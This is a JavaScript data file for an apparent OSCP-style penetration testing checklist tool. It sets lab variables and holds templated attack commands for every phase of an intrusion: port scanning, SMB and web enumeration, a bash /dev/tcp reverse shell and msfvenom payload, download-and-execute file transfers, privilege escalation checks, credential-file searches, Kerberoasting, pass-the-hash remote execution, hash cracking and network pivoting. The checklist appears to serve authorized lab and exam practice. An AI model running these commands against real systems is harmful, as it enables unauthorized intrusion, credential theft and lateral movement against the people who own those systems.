export const DEFAULT_VARIABLES = {
  lhost: "10.10.14.2",
  lport: "443",
  rhost: "192.168.45.100",
  rport: "80",
  targetName: "target-01",
  domain: "corp.local",
  baseDn: "DC=corp,DC=local",
  dc: "dc01.corp.local",
  user: "student",
  password: "Password123!",
  hash: "NTLM_OR_HASH",
  subnet: "172.16.10.0/24",
  interface: "tun0",
  wordlist: "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
};

export const VARIABLE_GROUPS = [
  { label: "Operator", keys: ["lhost", "lport", "interface"] },
  { label: "Target", keys: ["targetName", "rhost", "rport", "subnet"] },
  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "password", "hash"] },
  { label: "Resources", keys: ["wordlist"] },
];

export const CHECKLIST = [
  {
    id: "setup",
    number: "00",
    title: "Workspace setup",
    summary: "Make the evidence path, variables, and Kali resources predictable before touching the target.",
    items: [
      {
        id: "setup-workspace",
        title: "Create a target workspace",
        detail: "Keep raw scans and evidence separate from working files.",
        commands: [
          { label: "Create folders", value: "mkdir -p ~/oscp/{{targetName}}/{scans,web,loot,exploits,notes} && cd ~/oscp/{{targetName}}" },
          { label: "Start command log", value: "script -a ~/oscp/{{targetName}}/notes/terminal.log" },
        ],
      },
      {
        id: "setup-network",
        title: "Confirm VPN address and route",
        commands: [
          { label: "Interface", value: "ip -br address show {{interface}} && ip route" },
          { label: "Set local host", value: "export LHOST=$(ip -4 -o addr show {{interface}} | awk '{print $4}' | cut -d/ -f1) && echo $LHOST" },
        ],
      },
      {
        id: "setup-resources",
        title: "Verify Kali resource paths",
        detail: "Use the packaged resources first; discover exact binary names instead of assuming them.",
        commands: [
          { label: "Resource links", value: "ls -ld /usr/share/windows-resources /usr/share/wordlists /usr/share/seclists /usr/share/ligolo-ng-common-binaries" },
          { label: "Useful Windows binaries", value: "find /usr/share/windows-resources -type f \\( -iname 'winpeas*' -o -iname 'nc.exe' -o -iname 'mimikatz*' \\) 2>/dev/null" },
          { label: "Ligolo binaries", value: "find /usr/share/ligolo-ng-common-binaries -maxdepth 2 -type f -printf '%p\n'" },
        ],
      },
      {
        id: "setup-reachability",
        title: "Record baseline reachability",
        commands: [
          { label: "Ping", value: "ping -c 2 {{rhost}}" },
          { label: "No ICMP fallback", value: "sudo nmap -Pn -n -p 22,80,443,445,3389 {{rhost}}" },
        ],
      },
    ],
  },
  {
    id: "recon",
    number: "01",
    title: "Port discovery",
    summary: "Scan every TCP port, then investigate services with focused scripts. Do not let a default scan define the box.",
    items: [
      {
        id: "recon-tcp-all",
        title: "Scan all TCP ports",
        commands: [
          { label: "Full TCP", value: "sudo nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -oA ~/oscp/{{targetName}}/scans/tcp-all {{rhost}}" },
          { label: "Extract ports", value: "grep -oP '\\d+/open' ~/oscp/{{targetName}}/scans/tcp-all.gnmap | cut -d/ -f1 | paste -sd, -" },
        ],
      },
      {
        id: "recon-tcp-detail",
        title: "Fingerprint open TCP services",
        commands: [
          { label: "Focused scan", value: "sudo nmap -Pn -n -sCV -p {{rport}} -oA ~/oscp/{{targetName}}/scans/tcp-detail {{rhost}}" },
          { label: "Vulnerability hints", value: "nmap -Pn -n --script vuln -p {{rport}} -oN ~/oscp/{{targetName}}/scans/tcp-vuln.txt {{rhost}}" },
        ],
      },
      {
        id: "recon-udp",
        title: "Check common UDP services",
        commands: [
          { label: "Top UDP", value: "sudo nmap -Pn -n -sU --top-ports 100 --open -oA ~/oscp/{{targetName}}/scans/udp-top100 {{rhost}}" },
          { label: "Focused UDP", value: "sudo nmap -Pn -n -sU -sV -p 53,69,111,123,161,500,623 -oN ~/oscp/{{targetName}}/scans/udp-detail.txt {{rhost}}" },
        ],
      },
      {
        id: "recon-hostnames",
        title: "Resolve hostnames and virtual hosts",
        commands: [
          { label: "Certificate names", value: "for port in $(echo '{{rport}}' | tr ',' ' '); do cert=$(echo | timeout 3 openssl s_client -connect {{rhost}}:$port -servername {{rhost}} 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null); if [ -n \"$cert\" ]; then printf '\\n[+] Port %s:\\n%s\\n' \"$port\" \"$cert\"; fi; done | tee ~/oscp/{{targetName}}/scans/certificates.txt" },
          { label: "SSL cert scan", value: "nmap -Pn -n -p {{rport}} --script ssl-cert -oN ~/oscp/{{targetName}}/scans/ssl-certs.txt {{rhost}}" },
          { label: "Hosts entry", value: "echo '{{rhost}} {{targetName}} {{dc}} {{domain}}' | sudo tee -a /etc/hosts" },
        ],
      },
    ],
  },
  {
    id: "services",
    number: "02",
    title: "Service enumeration",
    summary: "Use a few dependable Kali tools and save raw output. Reuse every valid credential across exposed services.",
    items: [
      {
        id: "svc-smb",
        title: "SMB / RPC (139, 445)",
        commands: [
          { label: "Anonymous SMB", value: "nxc smb {{rhost}} -u '' -p '' --shares --users --groups" },
          { label: "Dump shares (Anonymous)", value: "mkdir -p ~/oscp/{{targetName}}/loot/smb && { smbclient -N -L //{{rhost}} 2>/dev/null || smbclient -U 'guest%' -L //{{rhost}} 2>/dev/null; } | awk '/Disk/ {print $1}' | while read -r s; do [ -z \"$s\" ] && continue; echo \"[*] Checking share: $s\"; mkdir -p ~/oscp/{{targetName}}/loot/smb/\"$s\" && (cd ~/oscp/{{targetName}}/loot/smb/\"$s\" && { smbclient //{{rhost}}/\"$s\" -N -c 'recurse ON; prompt OFF; mget *' >/dev/null 2>&1 || smbclient //{{rhost}}/\"$s\" -U 'guest%' -c 'recurse ON; prompt OFF; mget *' >/dev/null 2>&1; }); done && find ~/oscp/{{targetName}}/loot/smb -mindepth 1 -type d -empty -delete 2>/dev/null && ls -la ~/oscp/{{targetName}}/loot/smb/" },
          { label: "Authenticated SMB", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares --users --groups --sessions" },
          { label: "Download share", value: "smbclient //{{rhost}}/SHARE -U '{{domain}}/{{user}}%{{password}}' -c 'recurse ON; prompt OFF; mget *'" },
        ],
      },
      {
        id: "svc-ldap",
        title: "LDAP / Active Directory (389, 636)",
        commands: [
          { label: "Root DSE", value: "ldapsearch -x -H ldap://{{rhost}} -s base namingContexts defaultNamingContext" },
          { label: "Authenticated users", value: "ldapsearch -x -H ldap://{{dc}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(objectClass=user)' sAMAccountName memberOf" },
        ],
      },
      {
        id: "svc-nfs",
        title: "NFS / RPC (111, 2049)",
        commands: [
          { label: "Exports", value: "showmount -e {{rhost}} && nmap -Pn -p 111,2049 --script 'nfs-*' {{rhost}}" },
          { label: "Mount", value: "sudo mkdir -p /mnt/{{targetName}} && sudo mount -t nfs {{rhost}}:/EXPORT /mnt/{{targetName}} -o nolock" },
        ],
      },
      {
        id: "svc-snmp",
        title: "SNMP (161/udp)",
        commands: [
          { label: "Find community", value: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{rhost}}" },
          { label: "Walk", value: "snmpwalk -v2c -c public {{rhost}} .1 | tee ~/oscp/{{targetName}}/scans/snmpwalk.txt" },
        ],
      },
      {
        id: "svc-dns",
        title: "DNS (53)",
        commands: [
          { label: "Records", value: "dig @{{rhost}} {{domain}} ANY +noall +answer; dig @{{rhost}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short" },
          { label: "Zone transfer", value: "dig @{{rhost}} {{domain}} AXFR" },
        ],
      },
      {
        id: "svc-mail-ftp",
        title: "FTP and mail services",
        commands: [
          { label: "FTP anonymous", value: "ftp anonymous@{{rhost}}" },
          { label: "SMTP users", value: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{rhost}}" },
        ],
      },
    ],
  },
  {
    id: "web",
    number: "03",
    title: "Web enumeration",
    summary: "Map the application with curl and ffuf before reaching for specialized scanners.",
    items: [
      {
        id: "web-baseline",
        title: "Capture headers, technology, and source",
        commands: [
          { label: "Headers", value: "curl -k -i http://{{rhost}}:{{rport}}/ | tee ~/oscp/{{targetName}}/web/root-response.txt" },
          { label: "Fingerprint", value: "whatweb -a 3 http://{{rhost}}:{{rport}}/" },
          { label: "Common files", value: "for p in robots.txt sitemap.xml .git/HEAD .env; do echo ===$p; curl -ks http://{{rhost}}:{{rport}}/$p; done" },
        ],
      },
      {
        id: "web-content",
        title: "Discover content and files",
        commands: [
          { label: "Directories", value: "ffuf -u http://{{rhost}}:{{rport}}/FUZZ -w {{wordlist}} -e .php,.aspx,.txt,.bak,.zip -ac -c -o ~/oscp/{{targetName}}/web/ffuf-content.json" },
          { label: "Parameters", value: "ffuf -u 'http://{{rhost}}:{{rport}}/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c" },
        ],
      },
      {
        id: "web-vhosts",
        title: "Discover virtual hosts",
        commands: [
          { label: "Vhosts", value: "ffuf -u http://{{rhost}}:{{rport}}/ -H 'Host: FUZZ.{{domain}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
          { label: "DNS names", value: "ffuf -u http://FUZZ.{{domain}}:{{rport}}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
        ],
      },
      {
        id: "web-manual",
        title: "Test inputs and access controls manually",
        detail: "Proxy interesting requests, change one input at a time, and record the exact request that proves impact.",
        commands: [
          { label: "Replay request", value: "curl -k -i -X POST 'http://{{rhost}}:{{rport}}/login' -d 'username={{user}}&password={{password}}'" },
          { label: "SQLi confirmation", value: "sqlmap -r request.txt --batch --level 2 --risk 1 --output-dir=~/oscp/{{targetName}}/web/sqlmap" },
        ],
      },
    ],
  },
  {
    id: "access",
    number: "04",
    title: "Initial access & transfer",
    summary: "Validate versions, read the exploit, stage only what you need, and stabilize the first shell.",
    items: [
      {
        id: "access-research",
        title: "Research the exact service version",
        commands: [
          { label: "Searchsploit", value: "searchsploit --exclude='(PoC)|dos' '{{targetName}} {{rport}}'" },
          { label: "Copy exploit", value: "searchsploit -m EXPLOIT_ID && sed -n '1,220p' EXPLOIT_FILE" },
        ],
      },
      {
        id: "access-listener",
        title: "Start a listener",
        commands: [
          { label: "Netcat", value: "rlwrap -cAr nc -lvnp {{lport}}" },
          { label: "Socat TTY", value: "socat file:$(tty),raw,echo=0 tcp-listen:{{lport}}" },
        ],
      },
      {
        id: "access-shells",
        title: "Prepare simple reverse-shell payloads",
        commands: [
          { label: "Bash", value: "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'" },
          { label: "PowerShell", value: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o ~/oscp/{{targetName}}/exploits/shell.exe" },
        ],
      },
      {
        id: "access-transfer",
        title: "Transfer files from Kali",
        commands: [
          { label: "Serve current folder", value: "python3 -m http.server 8000 --bind {{lhost}}" },
          { label: "Linux download", value: "curl http://{{lhost}}:8000/FILE -o /tmp/FILE && chmod +x /tmp/FILE" },
          { label: "Windows download", value: "powershell -c \"iwr http://{{lhost}}:8000/FILE -OutFile C:\\Windows\\Temp\\FILE\"" },
        ],
      },
      {
        id: "access-tty",
        title: "Upgrade a Linux shell",
        commands: [
          { label: "Spawn PTY", value: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
          { label: "Fix terminal", value: "export TERM=xterm-256color; stty rows 40 columns 120" },
        ],
      },
    ],
  },
  {
    id: "linux-privesc",
    number: "05",
    title: "Linux privilege escalation",
    summary: "Start with identity and delegated rights, then inspect credentials, scheduled work, file permissions, and capabilities.",
    items: [
      {
        id: "linux-context",
        title: "Capture host and user context",
        commands: [
          { label: "Identity", value: "id; hostname; uname -a; cat /etc/os-release; ip -br a" },
          { label: "Sudo", value: "sudo -l" },
        ],
      },
      {
        id: "linux-files",
        title: "Check SUID, capabilities, and writable paths",
        commands: [
          { label: "SUID", value: "find / -perm -4000 -type f 2>/dev/null" },
          { label: "Capabilities", value: "getcap -r / 2>/dev/null" },
          { label: "Writable", value: "find /etc /opt /var /usr/local -writable -type f 2>/dev/null | head -200" },
        ],
      },
      {
        id: "linux-jobs",
        title: "Inspect processes and scheduled jobs",
        commands: [
          { label: "Processes", value: "ps auxwwf; ss -lntup" },
          { label: "Schedules", value: "cat /etc/crontab; ls -la /etc/cron* /var/spool/cron 2>/dev/null" },
          { label: "Systemd", value: "systemctl list-timers --all; find /etc/systemd /usr/lib/systemd -writable -type f 2>/dev/null" },
        ],
      },
      {
        id: "linux-secrets",
        title: "Search likely credential locations",
        commands: [
          { label: "Config secrets", value: "grep -RniE 'pass(word)?|secret|token|api.?key' /var/www /opt /home 2>/dev/null | head -200" },
          { label: "History and keys", value: "find /home /root -maxdepth 3 \\( -name '.*history' -o -name 'id_rsa' -o -name '*.kdbx' \\) -ls 2>/dev/null" },
        ],
      },
    ],
  },
  {
    id: "windows-privesc",
    number: "06",
    title: "Windows privilege escalation",
    summary: "Enumerate privileges, services, tasks, stored credentials, and local-only listeners before uploading helpers.",
    items: [
      {
        id: "windows-context",
        title: "Capture host and user context",
        commands: [
          { label: "Identity", value: "whoami /all & hostname & systeminfo & ipconfig /all" },
          { label: "Local users", value: "net user & net localgroup administrators" },
        ],
      },
      {
        id: "windows-services",
        title: "Inspect services and unquoted paths",
        commands: [
          { label: "Services", value: "powershell -c \"Get-CimInstance Win32_Service | Select Name,State,StartName,PathName | Format-Table -Auto\"" },
          { label: "Writable service binaries", value: "powershell -c \"Get-CimInstance Win32_Service | ? PathName | % { $_.PathName }\"" },
        ],
      },
      {
        id: "windows-jobs",
        title: "Inspect tasks, autoruns, and local ports",
        commands: [
          { label: "Scheduled tasks", value: "schtasks /query /fo LIST /v" },
          { label: "Autoruns", value: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run & reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
          { label: "Listeners", value: "netstat -ano | findstr LISTENING & tasklist /svc" },
        ],
      },
      {
        id: "windows-secrets",
        title: "Check stored credentials and configuration",
        commands: [
          { label: "Credential Manager", value: "cmdkey /list" },
          { label: "Unattended files", value: "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*.config 2>nul" },
          { label: "PowerShell history", value: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" },
        ],
      },
      {
        id: "windows-helper",
        title: "Run one packaged helper if manual checks stall",
        commands: [
          { label: "Find WinPEAS on Kali", value: "find /usr/share/windows-resources -type f \\( -iname 'winpeas*x64*.exe' -o -iname 'winPEASany.exe' \\) 2>/dev/null" },
          { label: "Save output", value: "winPEASx64.exe log=console > C:\\Windows\\Temp\\winpeas.txt" },
        ],
      },
    ],
  },
  {
    id: "active-directory",
    number: "07",
    title: "Active Directory",
    summary: "Fix names and time first. Prefer NetExec and Impacket so the Kali-side workflow stays small.",
    items: [
      {
        id: "ad-baseline",
        title: "Confirm domain DNS and clock",
        commands: [
          { label: "DNS", value: "dig @{{rhost}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short" },
          { label: "Sync time", value: "sudo ntpdate {{rhost}}" },
          { label: "Credential test", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares" },
        ],
      },
      {
        id: "ad-enum",
        title: "Enumerate users, groups, and policy",
        commands: [
          { label: "Users and groups", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --users --groups --pass-pol" },
          { label: "BloodHound collection", value: "bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{rhost}} -c All --zip" },
        ],
      },
      {
        id: "ad-roast",
        title: "Request offline-crackable material",
        commands: [
          { label: "AS-REP", value: "impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes" },
          { label: "Kerberoast", value: "impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{rhost}} -request -outputfile kerberoast.hashes" },
        ],
      },
      {
        id: "ad-remote",
        title: "Test permitted remote administration",
        commands: [
          { label: "WinRM", value: "nxc winrm {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "Evil-WinRM", value: "evil-winrm -i {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "WMI with hash", value: "impacket-wmiexec -hashes ':{{hash}}' '{{domain}}/{{user}}@{{rhost}}'" },
        ],
      },
    ],
  },
  {
    id: "credentials",
    number: "08",
    title: "Credentials",
    summary: "Identify the format, run a bounded offline attack, and record every reuse attempt instead of repeating it from memory.",
    items: [
      {
        id: "creds-identify",
        title: "Identify and normalize captured hashes",
        commands: [
          { label: "Identify", value: "hashid -m hashes.txt" },
          { label: "Show example modes", value: "hashcat --example-hashes | less" },
        ],
      },
      {
        id: "creds-crack",
        title: "Try the common Kali wordlist",
        commands: [
          { label: "Prepare rockyou", value: "test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz" },
          { label: "Hashcat", value: "hashcat -m HASH_MODE hashes.txt /usr/share/wordlists/rockyou.txt --status --session {{targetName}}" },
          { label: "John", value: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt && john --show hashes.txt" },
        ],
      },
      {
        id: "creds-reuse",
        title: "Test known credentials across the target",
        commands: [
          { label: "Network services", value: "for protocol in smb winrm ssh; do nxc \"$protocol\" {{rhost}} -u '{{user}}' -p '{{password}}' --continue-on-success; done" },
          { label: "SSH", value: "ssh -o PreferredAuthentications=password '{{user}}@{{rhost}}'" },
        ],
      },
    ],
  },
  {
    id: "pivoting",
    number: "09",
    title: "Pivoting",
    summary: "Use Ligolo-ng for a routable tunnel; use SSH dynamic forwarding when it is already available.",
    items: [
      {
        id: "pivot-ligolo-kali",
        title: "Prepare the Ligolo interface and proxy",
        commands: [
          { label: "Interface", value: "sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null; sudo ip link set ligolo up" },
          { label: "Find proxy", value: "find /usr/share/ligolo-ng-common-binaries -type f \\( -iname '*proxy*linux*' -o -iname 'proxy' \\)" },
          { label: "Route subnet", value: "sudo ip route add {{subnet}} dev ligolo" },
        ],
      },
      {
        id: "pivot-ligolo-agent",
        title: "Run the agent on the pivot host",
        commands: [
          { label: "Find agent", value: "find /usr/share/ligolo-ng-common-binaries -type f -iname '*agent*'" },
          { label: "Connect", value: "./agent -connect {{lhost}}:11601 -ignore-cert" },
        ],
      },
      {
        id: "pivot-ssh",
        title: "Use an SSH SOCKS tunnel when practical",
        commands: [
          { label: "Dynamic tunnel", value: "ssh -N -D 127.0.0.1:1080 {{user}}@{{rhost}}" },
          { label: "Scan through proxy", value: "proxychains4 -q nmap -sT -Pn -n -p 22,80,135,139,443,445,3389,5985 {{subnet}}" },
        ],
      },
    ],
  },
  {
    id: "proof",
    number: "10",
    title: "Proof & reporting",
    summary: "Capture the flag, identity, and network context together, then preserve command output and hashes.",
    items: [
      {
        id: "proof-linux",
        title: "Capture Linux proof context",
        commands: [
          { label: "Proof block", value: "hostname; whoami; id; ip -br address; cat /root/proof.txt 2>/dev/null || find /home -name local.txt -exec cat {} \\;" },
        ],
      },
      {
        id: "proof-windows",
        title: "Capture Windows proof context",
        commands: [
          { label: "Proof block", value: "hostname & whoami & ipconfig & type C:\\Users\\Administrator\\Desktop\\proof.txt" },
        ],
      },
      {
        id: "proof-artifacts",
        title: "Hash and inventory evidence",
        commands: [
          { label: "Evidence hashes", value: "find ~/oscp/{{targetName}} -type f -print0 | sort -z | xargs -0 sha256sum > ~/oscp/{{targetName}}/notes/SHA256SUMS" },
          { label: "File inventory", value: "find ~/oscp/{{targetName}} -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\n' | sort > ~/oscp/{{targetName}}/notes/inventory.txt" },
        ],
      },
      {
        id: "proof-cleanup",
        title: "Record cleanup and reset points",
        detail: "List uploaded files, changed configuration, created accounts, services, scheduled tasks, routes, and tunnels.",
        commands: [
          { label: "Stop terminal log", value: "exit" },
          { label: "Remove Ligolo route", value: "sudo ip route del {{subnet}} dev ligolo; sudo ip link del ligolo" },
        ],
      },
    ],
  },
];

export const ALL_ITEMS = CHECKLIST.flatMap((phase) =>
  phase.items.map((item) => ({ ...item, phaseId: phase.id, phaseTitle: phase.title })),
);
